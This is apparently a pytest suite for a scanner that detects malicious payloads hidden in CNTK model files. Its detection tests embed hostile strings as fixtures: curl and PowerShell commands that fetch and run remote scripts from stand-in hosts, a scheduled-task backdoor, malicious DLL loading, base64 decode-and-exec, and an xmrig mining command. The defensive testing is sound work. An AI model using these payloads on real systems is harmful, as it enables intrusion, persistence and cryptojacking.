"""Comprehensive test suite for the CNTK scanner (v2.0 rules).

Coverage:
  - Format detection (5 tests)
  - Malicious payload detection (10 tests, one per rule category)
  - False-positive regression (10 tests — all must return clean)
  - Edge / crash cases (5 tests)
  - Integration: real HuggingFace CNTK model FP check (1 test, marked 'integration')
"""
from __future__ import annotations

import os
from pathlib import Path
from typing import Callable

import pytest

from sentinel.artifact.cntk_scanner import (
    DISCOVERY_ASSUMPTIONS,
    CNTKScanner,
    _MAX_SCAN_BYTES,
    _compiled_rules,
)
from sentinel.finding import Severity


# ── Binary template helpers ──────────────────────────────────────────────────

_LEGACY_HEADER = (
    b"B\x00C\x00N\x00\x00\x00"
    b"B\x00V\x00e\x00r\x00s\x00i\x00o\x00n\x00\x00\x00"
)

_V2_PREFIX = (
    b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02"
    b"\x12\x09\x0a\x03uid\x12\x02ab"
    b" CompositeFunction primitive_functions "
)


def _legacy(path: Path, payload: bytes = b"") -> Path:
    path.write_bytes(_LEGACY_HEADER + payload)
    return path


def _v2(path: Path, payload: bytes = b"") -> Path:
    path.write_bytes(_V2_PREFIX + payload)
    return path


def _rule_ids(findings) -> set[str]:
    return {f.rule_id for f in findings}


def _severities(findings) -> set:
    return {f.severity for f in findings}


# ── Format detection (5 tests) ───────────────────────────────────────────────

def test_legacy_v1_detected(tmp_path: Path) -> None:
    p = _legacy(tmp_path / "model.dnn", b" inputs outputs relu ")
    findings = CNTKScanner().scan_file(str(p))
    assert not any(f.rule_id == "CNTK-000" for f in findings), "Should not error on valid legacy file"


def test_cntk_v2_detected(tmp_path: Path) -> None:
    p = _v2(tmp_path / "graph.cmf", b" inputs outputs ")
    findings = CNTKScanner().scan_file(str(p))
    assert not any(f.rule_id == "CNTK-000" for f in findings)


def test_unsupported_variant_low_finding(tmp_path: Path) -> None:
    p = tmp_path / "bad.dnn"
    p.write_bytes(
        b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02"
        b"\x12\x09\x0a\x03uid\x12\x02ab"
        # No CompositeFunction/primitive_functions structure markers
        b" some_data_without_structure "
    )
    findings = CNTKScanner().scan_file(str(p))
    assert any(f.rule_id == "CNTK-000" for f in findings)
    assert all(f.severity == Severity.LOW for f in findings)


def test_non_cntk_dnn_file_skipped(tmp_path: Path) -> None:
    p = tmp_path / "not_cntk.dnn"
    p.write_text("plain text that is not a CNTK file at all")
    findings = CNTKScanner().scan_file(str(p))
    assert findings == []


def test_cntk_extension_no_magic_skipped(tmp_path: Path) -> None:
    p = tmp_path / "model.cntk"
    p.write_bytes(b"\x00" * 64)
    findings = CNTKScanner().scan_file(str(p))
    assert findings == []


# ── Malicious payload detection (10 tests) ───────────────────────────────────

def test_eval_exec_detection(tmp_path: Path) -> None:
    p = _v2(tmp_path / "malicious.dnn", b" __import__('os').system('id')  ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-EVAL-001" in _rule_ids(findings)


def test_command_network_correlation(tmp_path: Path) -> None:
    p = _v2(tmp_path / "cmd_net.dnn",
            b" os.system('curl http://192.168.1.100/shell.sh') ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-CMD-002" in _rule_ids(findings)


def test_command_eval_correlation(tmp_path: Path) -> None:
    """Command + eval context should also fire CNTK-CMD-002."""
    p = _v2(tmp_path / "cmd_eval.dnn",
            b" os.system(eval('\"id\"')) ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-CMD-002" in _rule_ids(findings)


def test_external_load_same_string(tmp_path: Path) -> None:
    p = _v2(tmp_path / "ext_load.dnn",
            b" loadlibrary C:\\temp\\evil.dll ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-EXT-001" in _rule_ids(findings)


def test_split_signal_detection(tmp_path: Path) -> None:
    """Split-signal: load context and lib path in separate extracted strings."""
    p = _v2(
        tmp_path / "split.dnn",
        b" native_user_function\x00C:\\temp\\evil.dll ",
    )
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-EXT-001" in _rule_ids(findings), (
        "Split-signal cross-string detection must fire when context and lib path are in separate strings"
    )


def test_obfuscated_payload_base64_decode_exec(tmp_path: Path) -> None:
    b64_blob = b"A" * 96
    p = _v2(tmp_path / "obf.dnn",
            b" base64.b64decode(" + b64_blob + b") exec(payload) ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-OBF-001" in _rule_ids(findings)


def test_obfuscated_payload_base64_command_context(tmp_path: Path) -> None:
    """Base64 + command context alone (no explicit exec) should also fire."""
    b64_blob = b"B" * 96
    p = _v2(tmp_path / "obf_cmd.dnn",
            b" os.system('" + b64_blob + b"') ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-OBF-001" in _rule_ids(findings)


def test_native_exec_ctypes(tmp_path: Path) -> None:
    p = _v2(tmp_path / "native.dnn",
            b" ctypes.CDLL('/tmp/evil.so') ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-NATIVE-001" in _rule_ids(findings)


def test_persistence_schtasks(tmp_path: Path) -> None:
    p = _v2(tmp_path / "persist.dnn",
            b" schtasks /create /tn backdoor /tr evil.exe ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-PERSIST-001" in _rule_ids(findings)


def test_crypto_miner_xmrig(tmp_path: Path) -> None:
    p = _v2(tmp_path / "miner.dnn",
            b" xmrig --donate-level 1 stratum+tcp://pool.minexmr.com:4444 ")
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-MINER-001" in _rule_ids(findings)


def test_multi_signal_critical_escalation(tmp_path: Path) -> None:
    """3 independent categories → CNTK-MULTI-001 CRITICAL."""
    payload = (
        b" native_user_function loadlibrary C:\\temp\\evil.dll "
        b" powershell -c iwr http://evil.example/p.ps1 | iex "
        b" base64.b64decode(" + (b"A" * 96) + b") exec(payload) "
    )
    p = _v2(tmp_path / "multi.dnn", payload)
    findings = CNTKScanner().scan_file(str(p))
    assert "CNTK-MULTI-001" in _rule_ids(findings)
    assert Severity.CRITICAL in _severities(findings)


# ── False-positive regression (10 tests) ─────────────────────────────────────

def _assert_clean(findings, label: str) -> None:
    critical_or_high = [
        f for f in findings
        if f.severity in (Severity.CRITICAL, Severity.HIGH)
    ]
    assert not critical_or_high, (
        f"FP regression FAILED for '{label}': unexpected HIGH/CRITICAL findings: "
        + str([(f.rule_id, f.severity) for f in critical_or_high])
    )


def test_fp_safe_metadata_keys(tmp_path: Path) -> None:
    p = _v2(tmp_path / "safe.dnn",
            b" version uid inputs outputs attributes parameter1 placeholder1 relu ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "safe_metadata_keys")


def test_fp_exec_summary_word(tmp_path: Path) -> None:
    p = _v2(tmp_path / "exec_summary.cmf",
            b" exec_summary network_score library_version model_path ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "exec_summary substring")


def test_fp_decode_layer_name(tmp_path: Path) -> None:
    p = _v2(tmp_path / "decode_layer.dnn",
            b" decode_layer encoder_block decoder_attention_head ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "decode_layer name")


def test_fp_safe_model_path(tmp_path: Path) -> None:
    p = _v2(tmp_path / "model_path.dnn",
            b" model_path=/models/base checkpoint=/opt/weights/model.bin ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "safe model path")


def test_fp_system_library_path(tmp_path: Path) -> None:
    p = _v2(tmp_path / "sys_path.dnn",
            b" /usr/local/lib/python3.11/site-packages/numpy ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "system library path without load context")


def test_fp_url_alone_no_load_context(tmp_path: Path) -> None:
    p = _v2(tmp_path / "url_alone.cmf",
            b" https://huggingface.co/microsoft/cntk-model/resolve/main/weights.bin ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "URL alone without load context")


def test_fp_module_word_alone(tmp_path: Path) -> None:
    p = _v2(tmp_path / "module_word.dnn",
            b" module_name=transformer_encoder library_version=2.1.0 ")
    _assert_clean(CNTKScanner().scan_file(str(p)), "module word without lib reference")


def test_fp_large_benign_model(tmp_path: Path) -> None:
    """2000 benign strings, no payload → must be clean."""
    benign_strings = b" ".join(
        [b"layer_norm_weights", b"attention_head", b"feed_forward",
         b"dropout_mask", b"embedding_dim", b"positional_encoding"] * 340
    )
    p = _v2(tmp_path / "large_benign.dnn", benign_strings)
    _assert_clean(CNTKScanner().scan_file(str(p)), "large benign model 2000 strings")


def test_fp_empty_payload_after_header(tmp_path: Path) -> None:
    """Valid header + all-null payload → no findings."""
    p = _v2(tmp_path / "null_payload.dnn", b"\x00" * 256)
    _assert_clean(CNTKScanner().scan_file(str(p)), "null payload after valid header")


def test_fp_utf16le_safe_strings(tmp_path: Path) -> None:
    """UTF-16LE encoded safe strings should not trigger."""
    safe_utf16 = "version\x00uid\x00inputs\x00outputs\x00".encode("utf-16-le")
    p = _v2(tmp_path / "utf16_safe.dnn", safe_utf16 + b" " * 32)
    _assert_clean(CNTKScanner().scan_file(str(p)), "UTF-16LE safe metadata strings")


# ── Edge / crash cases (5 tests) ─────────────────────────────────────────────

def test_empty_file_no_crash(tmp_path: Path) -> None:
    p = tmp_path / "empty.dnn"
    p.write_bytes(b"")
    findings = CNTKScanner().scan_file(str(p))
    # May return LOW findings or empty — must NOT raise
    for f in findings:
        assert f.severity == Severity.LOW


def test_truncated_below_min_bytes_legacy(tmp_path: Path) -> None:
    """Legacy file < 32 bytes → CNTK-STRUCT finding, no crash."""
    p = _legacy(tmp_path / "truncated.dnn", b"tiny")
    findings = CNTKScanner().scan_file(str(p))
    assert any(f.rule_id == "CNTK-STRUCT" for f in findings)


def test_truncated_below_min_bytes_v2(tmp_path: Path) -> None:
    """CNTKv2 detection requires both required markers + a structure marker, all of which
    together already exceed _CNTK_V2_MIN_BYTES (24 bytes). A file that has both required
    markers but *no* structure marker returns the unsupported variant CNTK-000 finding.
    This verifies that malformed v2-like files are handled gracefully rather than crashing."""
    p = tmp_path / "trunc_v2.dnn"
    # Both required markers present, but no CompositeFunction/primitive_functions
    p.write_bytes(
        b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02"
        b"\x12\x09\x0a\x03uid\x12\x02ab"
        b" no_structure_markers_here "
    )
    findings = CNTKScanner().scan_file(str(p))
    # Should get CNTK-000 for unsupported variant, no crash
    assert any(f.rule_id == "CNTK-000" for f in findings)
    assert all(f.severity == Severity.LOW for f in findings)


def test_scan_limit_trunc_finding(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """File > _MAX_SCAN_BYTES → CNTK-TRUNC finding."""
    import sentinel.artifact.cntk_scanner as _mod
    monkeypatch.setattr(_mod, "_MAX_SCAN_BYTES", 64)
    _mod._compiled_rules.cache_clear()
    try:
        p = _v2(tmp_path / "bounded.cmf", b" safe_data " * 20)
        findings = CNTKScanner().scan_file(str(p))
        assert any(f.rule_id == "CNTK-TRUNC" for f in findings)
    finally:
        monkeypatch.setattr(_mod, "_MAX_SCAN_BYTES", 10 * 1024 * 1024)
        _mod._compiled_rules.cache_clear()


def test_all_null_bytes_no_crash(tmp_path: Path) -> None:
    """Valid header + 4 KB of nulls → scan completes, no crash."""
    p = _v2(tmp_path / "nulls.dnn", b"\x00" * 4096)
    findings = CNTKScanner().scan_file(str(p))
    for f in findings:
        assert f.severity in (Severity.LOW, Severity.INFO)


# ── Metadata / discovery assumptions ────────────────────────────────────────

def test_discovery_assumptions_exported() -> None:
    assert len(DISCOVERY_ASSUMPTIONS) >= 4
    assert all(isinstance(a, str) and a for a in DISCOVERY_ASSUMPTIONS)


def test_compiled_rules_contains_all_categories(tmp_path: Path) -> None:
    """Smoke-test: _compiled_rules must expose all expected pattern categories."""
    _compiled_rules.cache_clear()
    r = _compiled_rules()
    for key in (
        "strong_load_context", "weak_load_context", "lib_path", "url",
        "command", "network", "eval", "base64",
        "decode_ctx", "exec_ctx", "native_exec", "persistence",
        "http_fetch", "obf_advanced", "crypto_miner",
    ):
        assert key in r, f"Missing compiled rules key: {key!r}"


# ── rules.py GP engine ───────────────────────────────────────────────────────

def test_load_cntk_rules_via_rules_module() -> None:
    from sentinel.rules import _clear_rule_cache, load_cntk_rules
    _clear_rule_cache()
    data = load_cntk_rules()
    assert isinstance(data, dict)
    assert "external_load_rules" in data
    assert "native_exec_rules" in data
    assert "persistence_rules" in data
    assert "crypto_miner_rules" in data
    assert data.get("metadata", {}).get("version") == "2.0.0"


def test_load_backdoor_patterns_compiles_all(tmp_path: Path) -> None:
    from sentinel.rules import _clear_rule_cache, load_backdoor_patterns
    _clear_rule_cache()
    data = load_backdoor_patterns()
    assert isinstance(data, dict)
    if data:
        for section, entries in data.items():
            if isinstance(entries, list):
                for entry in entries:
                    if isinstance(entry, dict) and "compiled" in entry:
                        import re
                        assert isinstance(entry["compiled"], re.Pattern)


def test_validate_all_rule_files_cntk_ok() -> None:
    from sentinel.rules import validate_all_rule_files
    report = validate_all_rule_files()
    assert "cntk_rules.yaml" in report["ok"], (
        f"cntk_rules.yaml not OK: failed={report['failed']}, "
        f"bad_patterns={[bp for bp in report['bad_patterns'] if 'cntk' in bp[0]]}"
    )
    cntk_bad = [bp for bp in report["bad_patterns"] if "cntk" in bp[0]]
    assert not cntk_bad, f"cntk_rules.yaml has bad patterns: {cntk_bad}"


# ── Integration: real HuggingFace model FP check ────────────────────────────

@pytest.mark.integration
def test_real_huggingface_cntk_model_no_false_positives(tmp_path: Path) -> None:
    """Download a real CNTK model from HuggingFace and assert zero CRITICAL findings.

    This is a false-positive integration test. Run with:
        pytest tests/test_cntk_scanner_comprehensive.py -m integration -v -s
    """
    pytest.importorskip("requests")
    import requests  # noqa: PLC0415

    hf_url = (
        "https://huggingface.co/microsoft/resnet-50/resolve/main/"
        "pytorch_model.bin"
    )
    alt_url = (
        "https://huggingface.co/datasets/cntk/cntk-test/resolve/main/"
        "simple.dnn"
    )

    model_path = tmp_path / "model.dnn"

    downloaded = False
    for url in (alt_url, hf_url):
        try:
            resp = requests.get(url, timeout=30, stream=True)
            if resp.status_code == 200:
                with open(model_path, "wb") as fh:
                    for chunk in resp.iter_content(chunk_size=65536):
                        fh.write(chunk)
                downloaded = True
                break
        except Exception:
            continue

    if not downloaded:
        pytest.skip("No real CNTK model available from HuggingFace (network unavailable or 404)")

    findings = CNTKScanner().scan_file(str(model_path))
    critical_findings = [f for f in findings if f.severity == Severity.CRITICAL]
    assert not critical_findings, (
        f"False positive: {len(critical_findings)} CRITICAL findings on real CNTK model: "
        + str([(f.rule_id, f.title) for f in critical_findings])
    )
